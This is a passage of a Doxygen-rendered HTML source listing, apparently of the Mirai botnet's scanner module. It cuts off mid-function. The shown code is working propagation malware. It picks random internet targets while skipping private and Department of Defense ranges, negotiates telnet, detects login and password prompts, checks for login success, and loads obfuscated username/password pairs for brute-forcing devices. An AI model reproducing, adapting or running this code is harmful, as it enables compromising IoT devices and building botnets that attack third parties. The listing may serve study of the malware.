676</span>&#160;    uint32_t tmp;</div><div class="line"><a name="l00677"></a><span class="lineno">  677</span>&#160;    uint8_t o1, o2, o3, o4;</div><div class="line"><a name="l00678"></a><span class="lineno">  678</span>&#160;</div><div class="line"><a name="l00679"></a><span class="lineno">  679</span>&#160;    <span class="keywordflow">do</span></div><div class="line"><a name="l00680"></a><span class="lineno">  680</span>&#160;    {</div><div class="line"><a name="l00681"></a><span class="lineno">  681</span>&#160;        tmp = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00682"></a><span class="lineno">  682</span>&#160;</div><div class="line"><a name="l00683"></a><span class="lineno">  683</span>&#160;        o1 = tmp &amp; 0xff;</div><div class="line"><a name="l00684"></a><span class="lineno">  684</span>&#160;        o2 = (tmp &gt;&gt; 8) &amp; 0xff;</div><div class="line"><a name="l00685"></a><span class="lineno">  685</span>&#160;        o3 = (tmp &gt;&gt; 16) &amp; 0xff;</div><div class="line"><a name="l00686"></a><span class="lineno">  686</span>&#160;        o4 = (tmp &gt;&gt; 24) &amp; 0xff;</div><div class="line"><a name="l00687"></a><span class="lineno">  687</span>&#160;    }</div><div class="line"><a name="l00688"></a><span class="lineno">  688</span>&#160;    <span class="keywordflow">while</span> (o1 == 127 ||                             <span class="comment">// 127.0.0.0/8      - Loopback</span></div><div class="line"><a name="l00689"></a><span class="lineno">  689</span>&#160;          (o1 == 0) ||                              <span class="comment">// 0.0.0.0/8        - Invalid address space</span></div><div class="line"><a name="l00690"></a><span class="lineno">  690</span>&#160;          (o1 == 3) ||                              <span class="comment">// 3.0.0.0/8        - General Electric Company</span></div><div class="line"><a name="l00691"></a><span class="lineno">  691</span>&#160;          (o1 == 15 || o1 == 16) ||                 <span class="comment">// 15.0.0.0/7       - Hewlett-Packard Company</span></div><div class="line"><a name="l00692"></a><span class="lineno">  692</span>&#160;          (o1 == 56) ||                             <span class="comment">// 56.0.0.0/8       - US Postal Service</span></div><div class="line"><a name="l00693"></a><span class="lineno">  693</span>&#160;          (o1 == 10) ||                             <span class="comment">// 10.0.0.0/8       - Internal network</span></div><div class="line"><a name="l00694"></a><span class="lineno">  694</span>&#160;          (o1 == 192 &amp;&amp; o2 == 168) ||               <span class="comment">// 192.168.0.0/16   - Internal network</span></div><div class="line"><a name="l00695"></a><span class="lineno">  695</span>&#160;          (o1 == 172 &amp;&amp; o2 &gt;= 16 &amp;&amp; o2 &lt; 32) ||     <span class="comment">// 172.16.0.0/14    - Internal network</span></div><div class="line"><a name="l00696"></a><span class="lineno">  696</span>&#160;          (o1 == 100 &amp;&amp; o2 &gt;= 64 &amp;&amp; o2 &lt; 127) ||    <span class="comment">// 100.64.0.0/10    - IANA NAT reserved</span></div><div class="line"><a name="l00697"></a><span class="lineno">  697</span>&#160;          (o1 == 169 &amp;&amp; o2 &gt; 254) ||                <span class="comment">// 169.254.0.0/16   - IANA NAT reserved</span></div><div class="line"><a name="l00698"></a><span class="lineno">  698</span>&#160;          (o1 == 198 &amp;&amp; o2 &gt;= 18 &amp;&amp; o2 &lt; 20) ||     <span class="comment">// 198.18.0.0/15    - IANA Special use</span></div><div class="line"><a name="l00699"></a><span class="lineno">  699</span>&#160;          (o1 &gt;= 224) ||                            <span class="comment">// 224.*.*.*+       - Multicast</span></div><div class="line"><a name="l00700"></a><span class="lineno">  700</span>&#160;          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) <span class="comment">// Department of Defense</span></div><div class="line"><a name="l00701"></a><span class="lineno">  701</span>&#160;    );</div><div class="line"><a name="l00702"></a><span class="lineno">  702</span>&#160;</div><div class="line"><a name="l00703"></a><span class="lineno">  703</span>&#160;    <span class="keywordflow">return</span> <a class="code" href="mirai_2bot_2includes_8h.html#a31dbe0466c76698ccd7b518deec33c7c">INET_ADDR</a>(o1,o2,o3,o4);</div><div class="line"><a name="l00704"></a><span class="lineno">  704</span>&#160;}</div><div class="line"><a name="l00705"></a><span class="lineno">  705</span>&#160;</div><div class="line"><a name="l00706"></a><span class="lineno">  706</span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="scanner_8h.html#ae996c08c3150fc2db37f09479843eb82">consume_iacs</a>(<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a> *conn)</div><div class="line"><a name="l00707"></a><span class="lineno">  707</span>&#160;{</div><div class="line"><a name="l00708"></a><span class="lineno">  708</span>&#160;    <span class="keywordtype">int</span> consumed = 0;</div><div class="line"><a name="l00709"></a><span class="lineno">  709</span>&#160;    uint8_t *ptr = conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>;</div><div class="line"><a name="l00710"></a><span class="lineno">  710</span>&#160;</div><div class="line"><a name="l00711"></a><span class="lineno">  711</span>&#160;    <span class="keywordflow">while</span> (consumed &lt; conn-&gt;rdbuf_pos)</div><div class="line"><a name="l00712"></a><span class="lineno">  712</span>&#160;    {</div><div class="line"><a name="l00713"></a><span class="lineno">  713</span>&#160;        <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00714"></a><span class="lineno">  714</span>&#160;</div><div class="line"><a name="l00715"></a><span class="lineno">  715</span>&#160;        <span class="keywordflow">if</span> (*ptr != 0xff)</div><div class="line"><a name="l00716"></a><span class="lineno">  716</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00717"></a><span class="lineno">  717</span>&#160;        <span class="keywordflow">else</span> <span class="keywordflow">if</span> (*ptr == 0xff)</div><div class="line"><a name="l00718"></a><span class="lineno">  718</span>&#160;        {</div><div class="line"><a name="l00719"></a><span class="lineno">  719</span>&#160;            <span class="keywordflow">if</span> (!<a class="code" href="connection_8c.html#a7822780437d0519e7c36c8e6a4419f3a">can_consume</a>(conn, ptr, 1))</div><div class="line"><a name="l00720"></a><span class="lineno">  720</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00721"></a><span class="lineno">  721</span>&#160;            <span class="keywordflow">if</span> (ptr[1] == 0xff)</div><div class="line"><a name="l00722"></a><span class="lineno">  722</span>&#160;            {</div><div class="line"><a name="l00723"></a><span class="lineno">  723</span>&#160;                ptr += 2;</div><div class="line"><a name="l00724"></a><span class="lineno">  724</span>&#160;                consumed += 2;</div><div class="line"><a name="l00725"></a><span class="lineno">  725</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00726"></a><span class="lineno">  726</span>&#160;            }</div><div class="line"><a name="l00727"></a><span class="lineno">  727</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (ptr[1] == 0xfd)</div><div class="line"><a name="l00728"></a><span class="lineno">  728</span>&#160;            {</div><div class="line"><a name="l00729"></a><span class="lineno">  729</span>&#160;                uint8_t tmp1[3] = {255, 251, 31};</div><div class="line"><a name="l00730"></a><span class="lineno">  730</span>&#160;                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};</div><div class="line"><a name="l00731"></a><span class="lineno">  731</span>&#160;</div><div class="line"><a name="l00732"></a><span class="lineno">  732</span>&#160;                <span class="keywordflow">if</span> (!<a class="code" href="connection_8c.html#a7822780437d0519e7c36c8e6a4419f3a">can_consume</a>(conn, ptr, 2))</div><div class="line"><a name="l00733"></a><span class="lineno">  733</span>&#160;                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00734"></a><span class="lineno">  734</span>&#160;                <span class="keywordflow">if</span> (ptr[2] != 31)</div><div class="line"><a name="l00735"></a><span class="lineno">  735</span>&#160;                    <span class="keywordflow">goto</span> iac_wont;</div><div class="line"><a name="l00736"></a><span class="lineno">  736</span>&#160;</div><div class="line"><a name="l00737"></a><span class="lineno">  737</span>&#160;                ptr += 3;</div><div class="line"><a name="l00738"></a><span class="lineno">  738</span>&#160;                consumed += 3;</div><div class="line"><a name="l00739"></a><span class="lineno">  739</span>&#160;</div><div class="line"><a name="l00740"></a><span class="lineno">  740</span>&#160;                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, tmp1, 3, MSG_NOSIGNAL);</div><div class="line"><a name="l00741"></a><span class="lineno">  741</span>&#160;                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, tmp2, 9, MSG_NOSIGNAL);</div><div class="line"><a name="l00742"></a><span class="lineno">  742</span>&#160;            }</div><div class="line"><a name="l00743"></a><span class="lineno">  743</span>&#160;            <span class="keywordflow">else</span></div><div class="line"><a name="l00744"></a><span class="lineno">  744</span>&#160;            {</div><div class="line"><a name="l00745"></a><span class="lineno">  745</span>&#160;                iac_wont:</div><div class="line"><a name="l00746"></a><span class="lineno">  746</span>&#160;</div><div class="line"><a name="l00747"></a><span class="lineno">  747</span>&#160;                <span class="keywordflow">if</span> (!<a class="code" href="connection_8c.html#a7822780437d0519e7c36c8e6a4419f3a">can_consume</a>(conn, ptr, 2))</div><div class="line"><a name="l00748"></a><span class="lineno">  748</span>&#160;                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00749"></a><span class="lineno">  749</span>&#160;</div><div class="line"><a name="l00750"></a><span class="lineno">  750</span>&#160;                <span class="keywordflow">for</span> (i = 0; i &lt; 3; i++)</div><div class="line"><a name="l00751"></a><span class="lineno">  751</span>&#160;                {</div><div class="line"><a name="l00752"></a><span class="lineno">  752</span>&#160;                    <span class="keywordflow">if</span> (ptr[i] == 0xfd)</div><div class="line"><a name="l00753"></a><span class="lineno">  753</span>&#160;                        ptr[i] = 0xfc;</div><div class="line"><a name="l00754"></a><span class="lineno">  754</span>&#160;                    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (ptr[i] == 0xfb)</div><div class="line"><a name="l00755"></a><span class="lineno">  755</span>&#160;                        ptr[i] = 0xfd;</div><div class="line"><a name="l00756"></a><span class="lineno">  756</span>&#160;                }</div><div class="line"><a name="l00757"></a><span class="lineno">  757</span>&#160;</div><div class="line"><a name="l00758"></a><span class="lineno">  758</span>&#160;                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, ptr, 3, MSG_NOSIGNAL);</div><div class="line"><a name="l00759"></a><span class="lineno">  759</span>&#160;                ptr += 3;</div><div class="line"><a name="l00760"></a><span class="lineno">  760</span>&#160;                consumed += 3;</div><div class="line"><a name="l00761"></a><span class="lineno">  761</span>&#160;            }</div><div class="line"><a name="l00762"></a><span class="lineno">  762</span>&#160;        }</div><div class="line"><a name="l00763"></a><span class="lineno">  763</span>&#160;    }</div><div class="line"><a name="l00764"></a><span class="lineno">  764</span>&#160;</div><div class="line"><a name="l00765"></a><span class="lineno">  765</span>&#160;    <span class="keywordflow">return</span> consumed;</div><div class="line"><a name="l00766"></a><span class="lineno">  766</span>&#160;}</div><div class="line"><a name="l00767"></a><span class="lineno">  767</span>&#160;</div><div class="line"><a name="l00768"></a><span class="lineno">  768</span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="scanner_8h.html#a51caaf2e58a39d0e9a78aa3a633bde5e">consume_any_prompt</a>(<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a> *conn)</div><div class="line"><a name="l00769"></a><span class="lineno">  769</span>&#160;{</div><div class="line"><a name="l00770"></a><span class="lineno">  770</span>&#160;    <span class="keywordtype">char</span> *pch;</div><div class="line"><a name="l00771"></a><span class="lineno">  771</span>&#160;    <span class="keywordtype">int</span> i, prompt_ending = -1;</div><div class="line"><a name="l00772"></a><span class="lineno">  772</span>&#160;</div><div class="line"><a name="l00773"></a><span class="lineno">  773</span>&#160;    <span class="keywordflow">for</span> (i = conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> - 1; i &gt; 0; i--)</div><div class="line"><a name="l00774"></a><span class="lineno">  774</span>&#160;    {</div><div class="line"><a name="l00775"></a><span class="lineno">  775</span>&#160;        <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;:&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;&gt;&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;$&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;#&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;%&#39;</span>)</div><div class="line"><a name="l00776"></a><span class="lineno">  776</span>&#160;        {</div><div class="line"><a name="l00777"></a><span class="lineno">  777</span>&#160;            prompt_ending = i + 1;</div><div class="line"><a name="l00778"></a><span class="lineno">  778</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00779"></a><span class="lineno">  779</span>&#160;        }</div><div class="line"><a name="l00780"></a><span class="lineno">  780</span>&#160;    }</div><div class="line"><a name="l00781"></a><span class="lineno">  781</span>&#160;</div><div class="line"><a name="l00782"></a><span class="lineno">  782</span>&#160;    <span class="keywordflow">if</span> (prompt_ending == -1)</div><div class="line"><a name="l00783"></a><span class="lineno">  783</span>&#160;        <span class="keywordflow">return</span> 0;</div><div class="line"><a name="l00784"></a><span class="lineno">  784</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00785"></a><span class="lineno">  785</span>&#160;        <span class="keywordflow">return</span> prompt_ending;</div><div class="line"><a name="l00786"></a><span class="lineno">  786</span>&#160;}</div><div class="line"><a name="l00787"></a><span class="lineno">  787</span>&#160;</div><div class="line"><a name="l00788"></a><span class="lineno">  788</span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="scanner_8h.html#a5cec20bfe7b1203987fc68744b51b46a">consume_user_prompt</a>(<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a> *conn)</div><div class="line"><a name="l00789"></a><span class="lineno">  789</span>&#160;{</div><div class="line"><a name="l00790"></a><span class="lineno">  790</span>&#160;    <span class="keywordtype">char</span> *pch;</div><div class="line"><a name="l00791"></a><span class="lineno">  791</span>&#160;    <span class="keywordtype">int</span> i, prompt_ending = -1;</div><div class="line"><a name="l00792"></a><span class="lineno">  792</span>&#160;</div><div class="line"><a name="l00793"></a><span class="lineno">  793</span>&#160;    <span class="keywordflow">for</span> (i = conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> - 1; i &gt; 0; i--)</div><div class="line"><a name="l00794"></a><span class="lineno">  794</span>&#160;    {</div><div class="line"><a name="l00795"></a><span class="lineno">  795</span>&#160;        <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;:&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;&gt;&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;$&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;#&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;%&#39;</span>)</div><div class="line"><a name="l00796"></a><span class="lineno">  796</span>&#160;        {</div><div class="line"><a name="l00797"></a><span class="lineno">  797</span>&#160;            prompt_ending = i + 1;</div><div class="line"><a name="l00798"></a><span class="lineno">  798</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00799"></a><span class="lineno">  799</span>&#160;        }</div><div class="line"><a name="l00800"></a><span class="lineno">  800</span>&#160;    }</div><div class="line"><a name="l00801"></a><span class="lineno">  801</span>&#160;</div><div class="line"><a name="l00802"></a><span class="lineno">  802</span>&#160;    <span class="keywordflow">if</span> (prompt_ending == -1)</div><div class="line"><a name="l00803"></a><span class="lineno">  803</span>&#160;    {</div><div class="line"><a name="l00804"></a><span class="lineno">  804</span>&#160;        <span class="keywordtype">int</span> tmp;</div><div class="line"><a name="l00805"></a><span class="lineno">  805</span>&#160;</div><div class="line"><a name="l00806"></a><span class="lineno">  806</span>&#160;        <span class="keywordflow">if</span> ((tmp = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>, <span class="stringliteral">&quot;ogin&quot;</span>, 4)) != -1)</div><div class="line"><a name="l00807"></a><span class="lineno">  807</span>&#160;            prompt_ending = tmp;</div><div class="line"><a name="l00808"></a><span class="lineno">  808</span>&#160;        <span class="keywordflow">else</span> <span class="keywordflow">if</span> ((tmp = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>, <span class="stringliteral">&quot;enter&quot;</span>, 5)) != -1)</div><div class="line"><a name="l00809"></a><span class="lineno">  809</span>&#160;            prompt_ending = tmp;</div><div class="line"><a name="l00810"></a><span class="lineno">  810</span>&#160;    }</div><div class="line"><a name="l00811"></a><span class="lineno">  811</span>&#160;</div><div class="line"><a name="l00812"></a><span class="lineno">  812</span>&#160;    <span class="keywordflow">if</span> (prompt_ending == -1)</div><div class="line"><a name="l00813"></a><span class="lineno">  813</span>&#160;        <span class="keywordflow">return</span> 0;</div><div class="line"><a name="l00814"></a><span class="lineno">  814</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00815"></a><span class="lineno">  815</span>&#160;        <span class="keywordflow">return</span> prompt_ending;</div><div class="line"><a name="l00816"></a><span class="lineno">  816</span>&#160;}</div><div class="line"><a name="l00817"></a><span class="lineno">  817</span>&#160;</div><div class="line"><a name="l00818"></a><span class="lineno">  818</span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="scanner_8h.html#a47b695dfa82350e16fa161fb30e3af0d">consume_pass_prompt</a>(<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a> *conn)</div><div class="line"><a name="l00819"></a><span class="lineno">  819</span>&#160;{</div><div class="line"><a name="l00820"></a><span class="lineno">  820</span>&#160;    <span class="keywordtype">char</span> *pch;</div><div class="line"><a name="l00821"></a><span class="lineno">  821</span>&#160;    <span class="keywordtype">int</span> i, prompt_ending = -1;</div><div class="line"><a name="l00822"></a><span class="lineno">  822</span>&#160;</div><div class="line"><a name="l00823"></a><span class="lineno">  823</span>&#160;    <span class="keywordflow">for</span> (i = conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> - 1; i &gt; 0; i--)</div><div class="line"><a name="l00824"></a><span class="lineno">  824</span>&#160;    {</div><div class="line"><a name="l00825"></a><span class="lineno">  825</span>&#160;        <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;:&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;&gt;&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;$&#39;</span> || conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>[i] == <span class="charliteral">&#39;#&#39;</span>)</div><div class="line"><a name="l00826"></a><span class="lineno">  826</span>&#160;        {</div><div class="line"><a name="l00827"></a><span class="lineno">  827</span>&#160;            prompt_ending = i + 1;</div><div class="line"><a name="l00828"></a><span class="lineno">  828</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00829"></a><span class="lineno">  829</span>&#160;        }</div><div class="line"><a name="l00830"></a><span class="lineno">  830</span>&#160;    }</div><div class="line"><a name="l00831"></a><span class="lineno">  831</span>&#160;</div><div class="line"><a name="l00832"></a><span class="lineno">  832</span>&#160;    <span class="keywordflow">if</span> (prompt_ending == -1)</div><div class="line"><a name="l00833"></a><span class="lineno">  833</span>&#160;    {</div><div class="line"><a name="l00834"></a><span class="lineno">  834</span>&#160;        <span class="keywordtype">int</span> tmp;</div><div class="line"><a name="l00835"></a><span class="lineno">  835</span>&#160;</div><div class="line"><a name="l00836"></a><span class="lineno">  836</span>&#160;        <span class="keywordflow">if</span> ((tmp = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>, <span class="stringliteral">&quot;assword&quot;</span>, 7)) != -1)</div><div class="line"><a name="l00837"></a><span class="lineno">  837</span>&#160;            prompt_ending = tmp;</div><div class="line"><a name="l00838"></a><span class="lineno">  838</span>&#160;    }</div><div class="line"><a name="l00839"></a><span class="lineno">  839</span>&#160;</div><div class="line"><a name="l00840"></a><span class="lineno">  840</span>&#160;    <span class="keywordflow">if</span> (prompt_ending == -1)</div><div class="line"><a name="l00841"></a><span class="lineno">  841</span>&#160;        <span class="keywordflow">return</span> 0;</div><div class="line"><a name="l00842"></a><span class="lineno">  842</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00843"></a><span class="lineno">  843</span>&#160;        <span class="keywordflow">return</span> prompt_ending;</div><div class="line"><a name="l00844"></a><span class="lineno">  844</span>&#160;}</div><div class="line"><a name="l00845"></a><span class="lineno">  845</span>&#160;</div><div class="line"><a name="l00846"></a><span class="lineno">  846</span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="scanner_8h.html#ab511b60a1641bbf457b488b35887a583">consume_resp_prompt</a>(<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a> *conn)</div><div class="line"><a name="l00847"></a><span class="lineno">  847</span>&#160;{</div><div class="line"><a name="l00848"></a><span class="lineno">  848</span>&#160;    <span class="keywordtype">char</span> *tkn_resp;</div><div class="line"><a name="l00849"></a><span class="lineno">  849</span>&#160;    <span class="keywordtype">int</span> prompt_ending, len;</div><div class="line"><a name="l00850"></a><span class="lineno">  850</span>&#160;</div><div class="line"><a name="l00851"></a><span class="lineno">  851</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#ae37c352aff727690678d80789e9153a6">TABLE_SCAN_NCORRECT</a>);</div><div class="line"><a name="l00852"></a><span class="lineno">  852</span>&#160;    tkn_resp = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#ae37c352aff727690678d80789e9153a6">TABLE_SCAN_NCORRECT</a>, &amp;len);</div><div class="line"><a name="l00853"></a><span class="lineno">  853</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>, tkn_resp, len - 1) != -1)</div><div class="line"><a name="l00854"></a><span class="lineno">  854</span>&#160;    {</div><div class="line"><a name="l00855"></a><span class="lineno">  855</span>&#160;        <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#ae37c352aff727690678d80789e9153a6">TABLE_SCAN_NCORRECT</a>);</div><div class="line"><a name="l00856"></a><span class="lineno">  856</span>&#160;        <span class="keywordflow">return</span> -1;</div><div class="line"><a name="l00857"></a><span class="lineno">  857</span>&#160;    }</div><div class="line"><a name="l00858"></a><span class="lineno">  858</span>&#160;    <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#ae37c352aff727690678d80789e9153a6">TABLE_SCAN_NCORRECT</a>);</div><div class="line"><a name="l00859"></a><span class="lineno">  859</span>&#160;</div><div class="line"><a name="l00860"></a><span class="lineno">  860</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a79e035097ac55fe0a2533ca035b07102">TABLE_SCAN_RESP</a>);</div><div class="line"><a name="l00861"></a><span class="lineno">  861</span>&#160;    tkn_resp = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a79e035097ac55fe0a2533ca035b07102">TABLE_SCAN_RESP</a>, &amp;len);</div><div class="line"><a name="l00862"></a><span class="lineno">  862</span>&#160;    prompt_ending = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>, tkn_resp, len - 1);</div><div class="line"><a name="l00863"></a><span class="lineno">  863</span>&#160;    <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a79e035097ac55fe0a2533ca035b07102">TABLE_SCAN_RESP</a>);</div><div class="line"><a name="l00864"></a><span class="lineno">  864</span>&#160;</div><div class="line"><a name="l00865"></a><span class="lineno">  865</span>&#160;    <span class="keywordflow">if</span> (prompt_ending == -1)</div><div class="line"><a name="l00866"></a><span class="lineno">  866</span>&#160;        <span class="keywordflow">return</span> 0;</div><div class="line"><a name="l00867"></a><span class="lineno">  867</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00868"></a><span class="lineno">  868</span>&#160;        <span class="keywordflow">return</span> prompt_ending;</div><div class="line"><a name="l00869"></a><span class="lineno">  869</span>&#160;}</div><div class="line"><a name="l00870"></a><span class="lineno">  870</span>&#160;</div><div class="line"><a name="l00871"></a><span class="lineno">  871</span>&#160;<span class="keyword">static</span> <span class="keywordtype">void</span> <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="keywordtype">char</span> *enc_user, <span class="keywordtype">char</span> *enc_pass, uint16_t weight)</div><div class="line"><a name="l00872"></a><span class="lineno">  872</span>&#160;{</div><div class="line"><a name="l00873"></a><span class="lineno">  873</span>&#160;    <span class="keywordtype">int</span> tmp;</div><div class="line"><a name="l00874"></a><span class="lineno">  874</span>&#160;</div><div class="line"><a name="l00875"></a><span class="lineno">  875</span>&#160;    auth_table = realloc(auth_table, (auth_table_len + 1) * <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structscanner__auth.html">scanner_auth</a>));</div><div class="line"><a name="l00876"></a><span class="lineno">  876</span>&#160;    auth_table[auth_table_len].<a class="code" href="structscanner__auth.html#a6c84dac1e6b150aa887557303905d350">username</a> = <a class="code" href="scanner_8h.html#a82f55fd3cba4786206af43f82d84e92d">deobf</a>(enc_user, &amp;tmp);</div><div class="line"><a name="l00877"></a><span class="lineno">  877</span>&#160;    auth_table[auth_table_len].<a class="code" href="structscanner__auth.html#a57891f0877155a744c8aae3d700bcb0e">username_len</a> = (uint8_t)tmp;</div><div class="line"><a name="l00878"></a><span class="lineno">  878</span>&#160;    auth_table[auth_table_len].<a class="code" href="structscanner__auth.html#a6bb9828bf02ee7f1305fc8bdd3a059c5">password</a> = <a class="code" href="scanner_8h.html#a82f55fd3cba4786206af43f82d84e92d">deobf</a>(enc_pass, &amp;tmp);</div><div class="line"><a name="l00879"></a><span class="lineno">  879</span>&#160;    auth_table[auth_table_len].<a class="code" href="structscanner__auth.html#aeaed9effc2bdafc88641e686b2580d9d">password_len</a> = (uint8_t)tmp;</div><div class="line"><a name="l00880"></a><span class="lineno">  880</span>&#160;    auth_table[auth_table_len].<a class="code" href="structscanner__auth.html#a9c11408e5fcf5f8f9843a492bb9b1a9a">weight_min</a> = auth_table_max_weight;</div><div class="line"><a name="l00881"></a><span class="lineno">  881</span>&#160;    auth_table[auth_table_len++].<a class="code" href="structscanner__auth.html#ac1f99c887815fcb29fda89be5efed2c6">weight_max</a> = 